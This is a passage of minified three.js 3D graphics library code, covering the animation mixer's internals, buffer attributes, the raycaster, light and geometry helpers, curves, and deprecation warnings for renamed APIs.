b=this._bindings,c=a._cacheIndex,d=\n--this._nActiveBindings,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_lendControlInterpolant:function(){var a=this._controlInterpolants,b=this._nActiveControlInterpolants++,c=a[b];void 0===c&&(c=new Zc(new Float32Array(2),new Float32Array(2),1,this._controlInterpolantsResultBuffer),c.__cacheIndex=b,a[b]=c);return c},_takeBackControlInterpolant:function(a){var b=this._controlInterpolants,c=a.__cacheIndex,d=--this._nActiveControlInterpolants,e=b[d];a.__cacheIndex=d;b[d]=a;e.__cacheIndex=c;\nb[c]=e},_controlInterpolantsResultBuffer:new Float32Array(1)});Object.assign(cd.prototype,pa.prototype);Kd.prototype.clone=function(){return new Kd(void 0===this.value.clone?this.value:this.value.clone())};Eb.prototype=Object.create(I.prototype);Eb.prototype.constructor=Eb;Eb.prototype.isInstancedBufferGeometry=!0;Eb.prototype.addGroup=function(a,b,c){this.groups.push({start:a,count:b,materialIndex:c})};Eb.prototype.copy=function(a){var b=a.index;null!==b&&this.setIndex(b.clone());var b=a.attributes,\nc;for(c in b)this.addAttribute(c,b[c].clone());a=a.groups;c=0;for(b=a.length;c<b;c++){var d=a[c];this.addGroup(d.start,d.count,d.materialIndex)}return this};oe.prototype={constructor:oe,isInterleavedBufferAttribute:!0,get count(){return this.data.count},get array(){return this.data.array},setX:function(a,b){this.data.array[a*this.data.stride+this.offset]=b;return this},setY:function(a,b){this.data.array[a*this.data.stride+this.offset+1]=b;return this},setZ:function(a,b){this.data.array[a*this.data.stride+\nthis.offset+2]=b;return this},setW:function(a,b){this.data.array[a*this.data.stride+this.offset+3]=b;return this},getX:function(a){return this.data.array[a*this.data.stride+this.offset]},getY:function(a){return this.data.array[a*this.data.stride+this.offset+1]},getZ:function(a){return this.data.array[a*this.data.stride+this.offset+2]},getW:function(a){return this.data.array[a*this.data.stride+this.offset+3]},setXY:function(a,b,c){a=a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+\n1]=c;return this},setXYZ:function(a,b,c,d){a=a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;this.data.array[a+2]=d;return this},setXYZW:function(a,b,c,d,e){a=a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;this.data.array[a+2]=d;this.data.array[a+3]=e;return this}};ic.prototype={constructor:ic,isInterleavedBuffer:!0,set needsUpdate(a){!0===a&&this.version++},setArray:function(a){if(Array.isArray(a))throw new TypeError(\"THREE.BufferAttribute: array should be a Typed Array.\");\nthis.count=void 0!==a?a.length/this.stride:0;this.array=a},setDynamic:function(a){this.dynamic=a;return this},copy:function(a){this.array=new a.array.constructor(a.array);this.count=a.count;this.stride=a.stride;this.dynamic=a.dynamic;return this},copyAt:function(a,b,c){a*=this.stride;c*=b.stride;for(var d=0,e=this.stride;d<e;d++)this.array[a+d]=b.array[c+d];return this},set:function(a,b){void 0===b&&(b=0);this.array.set(a,b);return this},clone:function(){return(new this.constructor).copy(this)},onUpload:function(a){this.onUploadCallback=\na;return this}};jc.prototype=Object.create(ic.prototype);jc.prototype.constructor=jc;jc.prototype.isInstancedInterleavedBuffer=!0;jc.prototype.copy=function(a){ic.prototype.copy.call(this,a);this.meshPerAttribute=a.meshPerAttribute;return this};kc.prototype=Object.create(U.prototype);kc.prototype.constructor=kc;kc.prototype.isInstancedBufferAttribute=!0;kc.prototype.copy=function(a){U.prototype.copy.call(this,a);this.meshPerAttribute=a.meshPerAttribute;return this};pe.prototype={constructor:pe,linePrecision:1,\nset:function(a,b){this.ray.set(a,b)},setFromCamera:function(a,b){b&&b.isPerspectiveCamera?(this.ray.origin.setFromMatrixPosition(b.matrixWorld),this.ray.direction.set(a.x,a.y,.5).unproject(b).sub(this.ray.origin).normalize()):b&&b.isOrthographicCamera?(this.ray.origin.set(a.x,a.y,(b.near+b.far)/(b.near-b.far)).unproject(b),this.ray.direction.set(0,0,-1).transformDirection(b.matrixWorld)):console.error(\"THREE.Raycaster: Unsupported camera type.\")},intersectObject:function(a,b){var c=[];qe(a,this,c,\nb);c.sort(We);return c},intersectObjects:function(a,b){var c=[];if(!1===Array.isArray(a))return console.warn(\"THREE.Raycaster.intersectObjects: objects is not an Array.\"),c;for(var d=0,e=a.length;d<e;d++)qe(a[d],this,c,b);c.sort(We);return c}};re.prototype={constructor:re,start:function(){this.oldTime=this.startTime=(performance||Date).now();this.elapsedTime=0;this.running=!0},stop:function(){this.getElapsedTime();this.running=!1},getElapsedTime:function(){this.getDelta();return this.elapsedTime},\ngetDelta:function(){var a=0;this.autoStart&&!this.running&&this.start();if(this.running){var b=(performance||Date).now(),a=(b-this.oldTime)/1E3;this.oldTime=b;this.elapsedTime+=a}return a}};se.prototype={constructor:se,set:function(a,b,c){this.radius=a;this.phi=b;this.theta=c;return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.radius=a.radius;this.phi=a.phi;this.theta=a.theta;return this},makeSafe:function(){this.phi=Math.max(1E-6,Math.min(Math.PI-1E-6,this.phi));\nreturn this},setFromVector3:function(a){this.radius=a.length();0===this.radius?this.phi=this.theta=0:(this.theta=Math.atan2(a.x,a.z),this.phi=Math.acos(N.clamp(a.y/this.radius,-1,1)));return this}};te.prototype={constructor:te,set:function(a,b,c){this.radius=a;this.theta=b;this.y=c;return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.radius=a.radius;this.theta=a.theta;this.y=a.y;return this},setFromVector3:function(a){this.radius=Math.sqrt(a.x*a.x+a.z*a.z);\nthis.theta=Math.atan2(a.x,a.z);this.y=a.y;return this}};oa.prototype=Object.create(Aa.prototype);oa.prototype.constructor=oa;oa.prototype.createAnimation=function(a,b,c,d){b={start:b,end:c,length:c-b+1,fps:d,duration:(c-b)/d,lastFrame:0,currentFrame:0,active:!1,time:0,direction:1,weight:1,directionBackwards:!1,mirroredLoop:!1};this.animationsMap[a]=b;this.animationsList.push(b)};oa.prototype.autoCreateAnimations=function(a){for(var b=/([a-z]+)_?(\\d+)/i,c,d={},e=this.geometry,f=0,g=e.morphTargets.length;f<\ng;f++){var h=e.morphTargets[f].name.match(b);if(h&&1<h.length){var l=h[1];d[l]||(d[l]={start:Infinity,end:-Infinity});h=d[l];f<h.start&&(h.start=f);f>h.end&&(h.end=f);c||(c=l)}}for(l in d)h=d[l],this.createAnimation(l,h.start,h.end,a);this.firstAnimation=c};oa.prototype.setAnimationDirectionForward=function(a){if(a=this.animationsMap[a])a.direction=1,a.directionBackwards=!1};oa.prototype.setAnimationDirectionBackward=function(a){if(a=this.animationsMap[a])a.direction=-1,a.directionBackwards=!0};oa.prototype.setAnimationFPS=\nfunction(a,b){var c=this.animationsMap[a];c&&(c.fps=b,c.duration=(c.end-c.start)/c.fps)};oa.prototype.setAnimationDuration=function(a,b){var c=this.animationsMap[a];c&&(c.duration=b,c.fps=(c.end-c.start)/c.duration)};oa.prototype.setAnimationWeight=function(a,b){var c=this.animationsMap[a];c&&(c.weight=b)};oa.prototype.setAnimationTime=function(a,b){var c=this.animationsMap[a];c&&(c.time=b)};oa.prototype.getAnimationTime=function(a){var b=0;if(a=this.animationsMap[a])b=a.time;return b};oa.prototype.getAnimationDuration=\nfunction(a){var b=-1;if(a=this.animationsMap[a])b=a.duration;return b};oa.prototype.playAnimation=function(a){var b=this.animationsMap[a];b?(b.time=0,b.active=!0):console.warn(\"THREE.MorphBlendMesh: animation[\"+a+\"] undefined in .playAnimation()\")};oa.prototype.stopAnimation=function(a){if(a=this.animationsMap[a])a.active=!1};oa.prototype.update=function(a){for(var b=0,c=this.animationsList.length;b<c;b++){var d=this.animationsList[b];if(d.active){var e=d.duration/d.length;d.time+=d.direction*a;if(d.mirroredLoop){if(d.time>\nd.duration||0>d.time)d.direction*=-1,d.time>d.duration&&(d.time=d.duration,d.directionBackwards=!0),0>d.time&&(d.time=0,d.directionBackwards=!1)}else d.time%=d.duration,0>d.time&&(d.time+=d.duration);var f=d.start+N.clamp(Math.floor(d.time/e),0,d.length-1),g=d.weight;f!==d.currentFrame&&(this.morphTargetInfluences[d.lastFrame]=0,this.morphTargetInfluences[d.currentFrame]=1*g,this.morphTargetInfluences[f]=0,d.lastFrame=d.currentFrame,d.currentFrame=f);e=d.time%e/e;d.directionBackwards&&(e=1-e);d.currentFrame!==\nd.lastFrame?(this.morphTargetInfluences[d.currentFrame]=e*g,this.morphTargetInfluences[d.lastFrame]=(1-e)*g):this.morphTargetInfluences[d.currentFrame]=g}}};dd.prototype=Object.create(x.prototype);dd.prototype.constructor=dd;dd.prototype.isImmediateRenderObject=!0;ed.prototype=Object.create(ga.prototype);ed.prototype.constructor=ed;ed.prototype.update=function(){var a=new q,b=new q,c=new ya;return function(){var d=[\"a\",\"b\",\"c\"];this.object.updateMatrixWorld(!0);c.getNormalMatrix(this.object.matrixWorld);\nvar e=this.object.matrixWorld,f=this.geometry.attributes.position,g=this.object.geometry;if(g&&g.isGeometry)for(var h=g.vertices,l=g.faces,k=g=0,q=l.length;k<q;k++)for(var p=l[k],n=0,u=p.vertexNormals.length;n<u;n++){var x=p.vertexNormals[n];a.copy(h[p[d[n]]]).applyMatrix4(e);b.copy(x).applyMatrix3(c).normalize().multiplyScalar(this.size).add(a);f.setXYZ(g,a.x,a.y,a.z);g+=1;f.setXYZ(g,b.x,b.y,b.z);g+=1}else if(g&&g.isBufferGeometry)for(d=g.attributes.position,h=g.attributes.normal,n=g=0,u=d.count;n<\nu;n++)a.set(d.getX(n),d.getY(n),d.getZ(n)).applyMatrix4(e),b.set(h.getX(n),h.getY(n),h.getZ(n)),b.applyMatrix3(c).normalize().multiplyScalar(this.size).add(a),f.setXYZ(g,a.x,a.y,a.z),g+=1,f.setXYZ(g,b.x,b.y,b.z),g+=1;f.needsUpdate=!0;return this}}();lc.prototype=Object.create(x.prototype);lc.prototype.constructor=lc;lc.prototype.dispose=function(){this.cone.geometry.dispose();this.cone.material.dispose()};lc.prototype.update=function(){var a=new q,b=new q;return function(){var c=this.light.distance?\nthis.light.distance:1E3,d=c*Math.tan(this.light.angle);this.cone.scale.set(d,d,c);a.setFromMatrixPosition(this.light.matrixWorld);b.setFromMatrixPosition(this.light.target.matrixWorld);this.cone.lookAt(b.sub(a));this.cone.material.color.copy(this.light.color).multiplyScalar(this.light.intensity)}}();mc.prototype=Object.create(ga.prototype);mc.prototype.constructor=mc;mc.prototype.getBoneList=function(a){var b=[];a&&a.isBone&&b.push(a);for(var c=0;c<a.children.length;c++)b.push.apply(b,this.getBoneList(a.children[c]));\nreturn b};mc.prototype.update=function(){var a=new q,b=new S,c=new S;return function(){var d=this.geometry,e=d.getAttribute(\"position\");c.getInverse(this.root.matrixWorld);for(var f=0,g=0;f<this.bones.length;f++){var h=this.bones[f];h.parent&&h.parent.isBone&&(b.multiplyMatrices(c,h.matrixWorld),a.setFromMatrixPosition(b),e.setXYZ(g,a.x,a.y,a.z),b.multiplyMatrices(c,h.parent.matrixWorld),a.setFromMatrixPosition(b),e.setXYZ(g+1,a.x,a.y,a.z),g+=2)}d.getAttribute(\"position\").needsUpdate=!0}}();nc.prototype=\nObject.create(Aa.prototype);nc.prototype.constructor=nc;nc.prototype.dispose=function(){this.geometry.dispose();this.material.dispose()};nc.prototype.update=function(){this.material.color.copy(this.light.color).multiplyScalar(this.light.intensity)};oc.prototype=Object.create(x.prototype);oc.prototype.constructor=oc;oc.prototype.dispose=function(){this.children[0].geometry.dispose();this.children[0].material.dispose();this.children[1].geometry.dispose();this.children[1].material.dispose()};oc.prototype.update=\nfunction(){var a=new q,b=new q;return function(){var c=this.children[0],d=this.children[1];if(this.light.target){a.setFromMatrixPosition(this.light.matrixWorld);b.setFromMatrixPosition(this.light.target.matrixWorld);var e=b.clone().sub(a);c.lookAt(e);d.lookAt(e)}c.material.color.copy(this.light.color).multiplyScalar(this.light.intensity);d.material.color.copy(this.light.color).multiplyScalar(this.light.intensity);var d=.5*this.light.width,e=.5*this.light.height,c=c.geometry.getAttribute(\"position\"),\nf=c.array;f[0]=d;f[1]=-e;f[2]=0;f[3]=d;f[4]=e;f[5]=0;f[6]=-d;f[7]=e;f[8]=0;f[9]=-d;f[10]=e;f[11]=0;f[12]=-d;f[13]=-e;f[14]=0;f[15]=d;f[16]=-e;f[17]=0;c.needsUpdate=!0}}();pc.prototype=Object.create(x.prototype);pc.prototype.constructor=pc;pc.prototype.dispose=function(){this.children[0].geometry.dispose();this.children[0].material.dispose()};pc.prototype.update=function(){var a=new q,b=new J,c=new J;return function(){var d=this.children[0],e=d.geometry.getAttribute(\"color\");b.copy(this.light.color).multiplyScalar(this.light.intensity);\nc.copy(this.light.groundColor).multiplyScalar(this.light.intensity);for(var f=0,g=e.count;f<g;f++){var h=f<g/2?b:c;e.setXYZ(f,h.r,h.g,h.b)}d.lookAt(a.setFromMatrixPosition(this.light.matrixWorld).negate());e.needsUpdate=!0}}();fd.prototype=Object.create(ga.prototype);fd.prototype.constructor=fd;Ld.prototype=Object.create(ga.prototype);Ld.prototype.constructor=Ld;gd.prototype=Object.create(ga.prototype);gd.prototype.constructor=gd;gd.prototype.update=function(){var a=new q,b=new q,c=new ya;return function(){this.object.updateMatrixWorld(!0);\nc.getNormalMatrix(this.object.matrixWorld);for(var d=this.object.matrixWorld,e=this.geometry.attributes.position,f=this.object.geometry,g=f.vertices,f=f.faces,h=0,l=0,k=f.length;l<k;l++){var q=f[l],p=q.normal;a.copy(g[q.a]).add(g[q.b]).add(g[q.c]).divideScalar(3).applyMatrix4(d);b.copy(p).applyMatrix3(c).normalize().multiplyScalar(this.size).add(a);e.setXYZ(h,a.x,a.y,a.z);h+=1;e.setXYZ(h,b.x,b.y,b.z);h+=1}e.needsUpdate=!0;return this}}();qc.prototype=Object.create(x.prototype);qc.prototype.constructor=\nqc;qc.prototype.dispose=function(){var a=this.children[0],b=this.children[1];a.geometry.dispose();a.material.dispose();b.geometry.dispose();b.material.dispose()};qc.prototype.update=function(){var a=new q,b=new q,c=new q;return function(){a.setFromMatrixPosition(this.light.matrixWorld);b.setFromMatrixPosition(this.light.target.matrixWorld);c.subVectors(b,a);var d=this.children[0],e=this.children[1];d.lookAt(c);d.material.color.copy(this.light.color).multiplyScalar(this.light.intensity);e.lookAt(c);\ne.scale.z=c.length()}}();hd.prototype=Object.create(ga.prototype);hd.prototype.constructor=hd;hd.prototype.update=function(){function a(a,g,h,l){d.set(g,h,l).unproject(e);a=c[a];if(void 0!==a)for(g=b.getAttribute(\"position\"),h=0,l=a.length;h<l;h++)g.setXYZ(a[h],d.x,d.y,d.z)}var b,c,d=new q,e=new ra;return function(){b=this.geometry;c=this.pointMap;e.projectionMatrix.copy(this.camera.projectionMatrix);a(\"c\",0,0,-1);a(\"t\",0,0,1);a(\"n1\",-1,-1,-1);a(\"n2\",1,-1,-1);a(\"n3\",-1,1,-1);a(\"n4\",1,1,-1);a(\"f1\",\n-1,-1,1);a(\"f2\",1,-1,1);a(\"f3\",-1,1,1);a(\"f4\",1,1,1);a(\"u1\",.7,1.1,-1);a(\"u2\",-.7,1.1,-1);a(\"u3\",0,2,-1);a(\"cf1\",-1,0,1);a(\"cf2\",1,0,1);a(\"cf3\",0,-1,1);a(\"cf4\",0,1,1);a(\"cn1\",-1,0,-1);a(\"cn2\",1,0,-1);a(\"cn3\",0,-1,-1);a(\"cn4\",0,1,-1);b.getAttribute(\"position\").needsUpdate=!0}}();rc.prototype=Object.create(ga.prototype);rc.prototype.constructor=rc;rc.prototype.update=function(){var a=new Pa;return function(b){b&&b.isBox3?a.copy(b):a.setFromObject(b);if(!a.isEmpty()){b=a.min;var c=a.max,d=this.geometry.attributes.position,\ne=d.array;e[0]=c.x;e[1]=c.y;e[2]=c.z;e[3]=b.x;e[4]=c.y;e[5]=c.z;e[6]=b.x;e[7]=b.y;e[8]=c.z;e[9]=c.x;e[10]=b.y;e[11]=c.z;e[12]=c.x;e[13]=c.y;e[14]=b.z;e[15]=b.x;e[16]=c.y;e[17]=b.z;e[18]=b.x;e[19]=b.y;e[20]=b.z;e[21]=c.x;e[22]=b.y;e[23]=b.z;d.needsUpdate=!0;this.geometry.computeBoundingSphere()}}}();var Md,ue;Fb.prototype=Object.create(x.prototype);Fb.prototype.constructor=Fb;Fb.prototype.setDirection=function(){var a=new q,b;return function(c){.99999<c.y?this.quaternion.set(0,0,0,1):-.99999>c.y?this.quaternion.set(1,\n0,0,0):(a.set(c.z,0,-c.x).normalize(),b=Math.acos(c.y),this.quaternion.setFromAxisAngle(a,b))}}();Fb.prototype.setLength=function(a,b,c){void 0===b&&(b=.2*a);void 0===c&&(c=.2*b);this.line.scale.set(1,Math.max(0,a-b),1);this.line.updateMatrix();this.cone.scale.set(c,b,c);this.cone.position.y=a;this.cone.updateMatrix()};Fb.prototype.setColor=function(a){this.line.material.color.copy(a);this.cone.material.color.copy(a)};Nd.prototype=Object.create(ga.prototype);Nd.prototype.constructor=Nd;var Qd=new q,\nye=new ve,ze=new ve,Ae=new ve;va.prototype=Object.create(ua.prototype);va.prototype.constructor=va;va.prototype.getPoint=function(a){var b=this.points,c=b.length;2>c&&console.log(\"duh, you need at least 2 points\");a*=c-(this.closed?0:1);var d=Math.floor(a);a-=d;this.closed?d+=0<d?0:(Math.floor(Math.abs(d)/b.length)+1)*b.length:0===a&&d===c-1&&(d=c-2,a=1);var e,f,g;this.closed||0<d?e=b[(d-1)%c]:(Qd.subVectors(b[0],b[1]).add(b[0]),e=Qd);f=b[d%c];g=b[(d+1)%c];this.closed||d+2<c?b=b[(d+2)%c]:(Qd.subVectors(b[c-\n1],b[c-2]).add(b[c-1]),b=Qd);if(void 0===this.type||\"centripetal\"===this.type||\"chordal\"===this.type){var h=\"chordal\"===this.type?.5:.25,c=Math.pow(e.distanceToSquared(f),h),d=Math.pow(f.distanceToSquared(g),h),h=Math.pow(g.distanceToSquared(b),h);1E-4>d&&(d=1);1E-4>c&&(c=d);1E-4>h&&(h=d);ye.initNonuniformCatmullRom(e.x,f.x,g.x,b.x,c,d,h);ze.initNonuniformCatmullRom(e.y,f.y,g.y,b.y,c,d,h);Ae.initNonuniformCatmullRom(e.z,f.z,g.z,b.z,c,d,h)}else\"catmullrom\"===this.type&&(c=void 0!==this.tension?this.tension:\n.5,ye.initCatmullRom(e.x,f.x,g.x,b.x,c),ze.initCatmullRom(e.y,f.y,g.y,b.y,c),Ae.initCatmullRom(e.z,f.z,g.z,b.z,c));return new q(ye.calc(a),ze.calc(a),Ae.calc(a))};id.prototype=Object.create(ua.prototype);id.prototype.constructor=id;id.prototype.getPoint=function(a){var b=this.v0,c=this.v1,d=this.v2,e=this.v3;return new q(Bb(a,b.x,c.x,d.x,e.x),Bb(a,b.y,c.y,d.y,e.y),Bb(a,b.z,c.z,d.z,e.z))};jd.prototype=Object.create(ua.prototype);jd.prototype.constructor=jd;jd.prototype.getPoint=function(a){var b=this.v0,\nc=this.v1,d=this.v2;return new q(Ab(a,b.x,c.x,d.x),Ab(a,b.y,c.y,d.y),Ab(a,b.z,c.z,d.z))};kd.prototype=Object.create(ua.prototype);kd.prototype.constructor=kd;kd.prototype.getPoint=function(a){if(1===a)return this.v2.clone();var b=new q;b.subVectors(this.v2,this.v1);b.multiplyScalar(a);b.add(this.v1);return b};Od.prototype=Object.create(Wa.prototype);Od.prototype.constructor=Od;ua.create=function(a,b){console.log(\"THREE.Curve.create() has been deprecated\");a.prototype=Object.create(ua.prototype);a.prototype.constructor=\na;a.prototype.getPoint=b;return a};Xe.prototype=Object.create(va.prototype);Ye.prototype=Object.create(va.prototype);we.prototype=Object.create(va.prototype);Object.assign(we.prototype,{initFromArray:function(a){console.error(\"THREE.Spline: .initFromArray() has been removed.\")},getControlPointsArray:function(a){console.error(\"THREE.Spline: .getControlPointsArray() has been removed.\")},reparametrizeByArcLength:function(a){console.error(\"THREE.Spline: .reparametrizeByArcLength() has been removed.\")}});\nfd.prototype.setColors=function(){console.error(\"THREE.GridHelper: setColors() has been deprecated, pass them in the constructor instead.\")};Object.assign(sc.prototype,{center:function(a){console.warn(\"THREE.Box2: .center() has been renamed to .getCenter().\");return this.getCenter(a)},empty:function(){console.warn(\"THREE.Box2: .empty() has been renamed to .isEmpty().\");return this.isEmpty()},isIntersectionBox:function(a){console.warn(\"THREE.Box2: .isIntersectionBox() has been renamed to .intersectsBox().\");\nreturn this.intersectsBox(a)},size:function(a){console.warn(\"THREE.Box2: .size() has been renamed to .getSize().\");return this.getSize(a)}});Object.assign(Pa.prototype,{center:function(a){console.warn(\"THREE.Box3: .center() has been renamed to .getCenter().\");return this.getCenter(a)},empty:function(){console.warn(\"THREE.Box3: .empty() has been renamed to .isEmpty().\");return this.isEmpty()},isIntersectionBox:function(a){console.warn(\"THREE.Box3: .isIntersectionBox() has been renamed to .intersectsBox().\");\nreturn this.intersectsBox(a)},isIntersectionSphere:function(a){console.warn(\"THREE.Box3: .isIntersectionSphere() has been renamed to .intersectsSphere().\");return this.intersectsSphere(a)},size:function(a){console.warn(\"THREE.Box3: .size() has been renamed to .getSize().\");return this.getSize(a)}});hb.prototype.center=function(a){console.warn(\"THREE.Line3: .center() has been renamed to .getCenter().\");return this.getCenter(a)};N.random16=function(){console.warn(\"THREE.Math.random16() has been deprecated. Use Math.random() instead.\");\nreturn Math.random()};Object.assign(ya.prototype,{flattenToArrayOffset:function(a,b){console.warn(\"THREE.Matrix3: .flattenToArrayOffset() has been deprecated. Use .toArray() instead.\");return this.toArray(a,b)},multiplyVector3:function(a){console.warn(\"THREE.Matrix3: .multiplyVector3() has been removed. Use vector.applyMatrix3( matrix ) instead.\");return a.applyMatrix3(this)},multiplyVector3Array:function(a){console.warn(\"THREE.Matrix3: .multiplyVector3Array() has been renamed. Use matrix.applyToVector3Array( array ) instead.\");\nreturn this.applyToVector3Array(a)},applyToBuffer:function(a,b,c){console.warn(\"THREE.Matrix3: .applyToBuffer() has been removed. Use matrix.applyToBufferAttribute( attribute ) instead.\");return this.applyToBufferAttribute(a)},applyToVector3Array:function(a,b,c){console.error(\"THREE.Matrix3: .applyToVector3Array() has been removed.\")}});Object.assign(S.prototype,{extractPosition:function(a){console.warn(\"THREE.Matrix4: .extractPosition() has been renamed to .copyPosition().\");return this.copyPosition(a)},\nflattenToArrayOffset:function(a,b){console.warn(\"THREE.Matrix4: .flattenToArrayOffset() has been deprecated. Use .toArray() instead.\");return this.toArray(a,b)},getPosition:function(){var a;return function(){void 0===a&&(a=new q);console.warn(\"THREE.Matrix4: .getPosition() has been removed. Use Vector3.setFromMatrixPosition( matrix ) instead.\");return a.setFromMatrixColumn(this,3)}}(),setRotationFromQuaternion:function(a){console.warn(\"THREE.Matrix4: .setRotationFromQuaternion() has been renamed to .makeRotationFromQuaternion().\");\nreturn this.makeRotationFromQuaternion(a)},multiplyVector3:function(a){console.warn(\"THREE.Matrix4: .multiplyVector3() has been removed. Use vector.applyMatrix4( matrix ) instead.\");return a.applyMatrix4(this)},multiplyVector4:function(a){console.warn(\"THREE.Matrix4: .multiplyVector4() has been removed. Use vector.applyMatrix4( matrix ) instead.\");return a.applyMatrix4(this)},multiplyVector3Array:function(a){console.warn(\"THREE.Matrix4: .multiplyVector3Array() has been renamed. Use matrix.applyToVector3Array( array ) instead.\");\nreturn this.applyToVector3Array(a)},rotateAxis:function(a){console.warn(\"THREE.Matrix4: .rotateAxis() has been removed. Use Vector3.transformDirection( matrix ) instead.\");a.transformDirection(this)},crossVector:function(a){console.warn(\"THREE.Matrix4: .crossVector() has been removed. Use vector.applyMatrix4( matrix ) instead.\");return a.applyMatrix4(this)},translate:function(){console.error(\"THREE.Matrix4: .translate() has been removed.\")},rotateX:function(){console.error(\"THREE.Matrix4: .rotateX() has been removed.\")},\nrotateY:function(){console.error(\"THREE.Matrix4: .rotateY() has been removed.\")},rotateZ:function(){console.error(\"THREE.Matrix4: .rotateZ() has been removed.\")},rotateByAxis:function(){console.error(\"THREE.Matrix4: .rotateByAxis() has been removed.\")},applyToBuffer:function(a,b,c){console.warn(\"THREE.Matrix4: .applyToBuffer() has been removed. Use matrix.applyToBufferAttribute( attribute ) instead.\");return this.applyToBufferAttribute(a)},applyToVector3Array:function(a,b,c){console.error(\"THREE.Matrix4: .applyToVector3Array() has been removed.\")},\nmakeFrustum:function(a,b,c,d,e,f){console.warn(\"THREE.Matrix4: .makeFrustum() has been removed. Use .makePerspective( left, right, top, bottom, near, far ) instead.\");return this.makePerspective(a,b,d,c,e,f)}});la.prototype.isIntersectionLine=function(a){console.warn(\"THREE.Plane: .isIntersectionLine() has been renamed to .intersectsLine().\");return this.intersectsLine(a)};ca.prototype.multiplyVector3=function(a){console.warn(\"THREE.Quaternion: .multiplyVector3() has been removed. Use is now vector.applyQuaternion( quaternion ) instead.\");\nreturn a.applyQuaternion(this)};Object.assign(cb.prototype,{isIntersectionBox:function(a){console.warn(\"THREE.Ray: .isIntersectionBox() has been renamed to .intersectsBox().\");return this.intersectsBox(a)},isIntersectionPlane:function(a){console.warn(\"THREE.Ray: .isIntersectionPlane() has been renamed to .intersectsPlane().\");return this.intersectsPlane(a)},isIntersectionSphere:function(a){console.warn(\"THREE.Ray: .isIntersectionSphere() has been renamed to .intersectsSphere().\");return this.intersectsSphere(a)}});\nObject.assign(Db.prototype,{extrude:function(a){console.warn(\"THREE.Shape: .extrude() has been removed. Use ExtrudeGeometry() instead.\");return new La(this,a)},makeGeometry:function(a){console.warn(\"THREE.Shape: .makeGeometry() has been removed. Use ShapeGeometry() instead.\");return new Yb(this,a)}});Object.assign(D.prototype,{fromAttribute:function(a,b,c){console.error(\"THREE.Vector2: .fromAttribute() has been renamed to .fromBufferAttribute().\");return this.fromBufferAttribute(a,b,c)}});Object.assign(q.prototype,\n{setEulerFromRotationMatrix:function(){console.error(\"THREE.Vector3: .setEulerFromRotationMatrix() has been removed. Use Euler.setFromRotationMatrix() instead.\")},setEulerFromQuaternion:function(){console.error(\"THREE.Vector3: .setEulerFromQuaternion() has been removed. Use Euler.setFromQuaternion() instead.\")},getPositionFromMatrix:function(a){console.warn(\"THREE.Vector3: .getPositionFromMatrix() has been renamed to .setFromMatrixPosition().\");return this.setFromMatrixPosition(a)},getScaleFromMatrix:function(a){console.warn(\"THREE.Vector3: .getScaleFromMatrix() has been renamed to .setFromMatrixScale().\");\nreturn this.setFromMatrixScale(a)},getColumnFromMatrix:function(a,b){console.warn(\"THREE.Vector3: .getColumnFromMatrix() has been renamed to .setFromMatrixColumn().\");return this.setFromMatrixColumn(b,a)},applyProjection:function(a){console.warn(\"THREE.Vector3: .applyProjection() has been removed. Use .applyMatrix4( m ) instead.\");return this.applyMatrix4(a)},fromAttribute:function(a,b,c){console.error(\"THREE.Vector3: .fromAttribute() has been renamed to .fromBufferAttribute().\");return this.fromBufferAttribute(a,\nb,c)}});Object.assign(fa.prototype,{fromAttribute:function(a,b,c){console.error(\"THREE.Vector4: .fromAttribute() has been renamed to .fromBufferAttribute().\");return this.fromBufferAttribute(a,b,c)}});T.prototype.computeTangents=function(){console.warn(\"THREE.Geometry: .computeTangents() has been removed.\")};Object.assign(x.prototype,{getChildByName:function(a){console.warn(\"THREE.Object3D: .getChildByName() has been renamed to .getObjectByName().\");return this.getObjectByName(a)},renderDepth:function(){console.warn(\"THREE.Object3D: .renderDepth has been removed. Use .renderOrder, instead.\")},\ntranslate:function(a,b){console.warn(\"THREE.Object3D: .translate() has been removed. Use .translateOnAxis( axis, distance ) instead.\");return this.translateOnAxis(b,a)}});Object.defineProperties(x.prototype,{eulerOrder:{get:function(){console.warn(\"THREE.Object3D: .eulerOrder is now .rotation.order.\");return this.rotation.order},set:function(a){console.warn(\"THREE.Object3D: .eulerOrder is now .rotation.order.\");this.rotation.order=a}},useQuaternion:{get:function(){console.warn(\"THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.\")},\nset:function(){console.warn(\"THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.\")}}});Object.defineProperties(Ec.prototype,{objects:{get:function(){console.warn(\"THREE.LOD: .objects has been renamed to .levels.\");return this.levels}}});Fa.prototype.setLens=function(a,b){console.warn(\"THREE.PerspectiveCamera.setLens is deprecated. Use .setFocalLength and .filmGauge for a photographic setup.\");void 0!==b&&(this.filmGauge=b);this.setFocalLength(a)};Object.defineProperties(ma.prototype,\n{onlyShadow:{set:function(){console.warn(\"THREE.Light: .onlyShadow has been removed.\")}},shadowCameraFov:{set:function(a){console.warn(\"THREE.Light: .shadowCameraFov is now .shadow.camera.fov.\");this.shadow.camera.fov=a}},shadowCameraLeft:{set:function(a){console.warn(\"THREE.Light: .shadowCameraLeft is now .shadow.camera.left.\");this.shadow.camera.left=a}},shadowCameraRight:{set:function(a){console.warn(\"THREE.Light: .shadowCameraRight is now .shadow.camera.right.\");this.shadow.camera.right=a}},shadowCameraTop:{set:function(a){console.warn(\"THREE.Light: .shadowCameraTop is now .shadow.camera.top.\");\nthis.shadow.camera.top=a}},shadowCameraBottom:{set:function(a){console.warn(\"THREE.Light: .shadowCameraBottom is now .shadow.camera.bottom.\");this.shadow.camera.bottom=a}},shadowCameraNear:{set:function(a){console.warn(\"THREE.Light: .shadowCameraNear is now .shadow.camera.near.\");this.shadow.camera.near=a}},shadowCameraFar:{set:function(a){console.warn(\"THREE.Light: .shadowCameraFar is now .shadow.camera.far.\");this.shadow.camera.far=a}},shadowCameraVisible:{set:function(){console.warn(\"THREE.Light: .shadowCameraVisible has been removed. Use new THREE.CameraHelper( light.shadow.camera ) instead.\")}},\nshadowBias:{set:function(a){console.warn(\"THREE.Light: .shadowBias is now .shadow.bias.\");this.shadow.bias=a}},shadowDarkness:{set:function(){console.warn(\"THREE.Light: .shadowDarkness has been 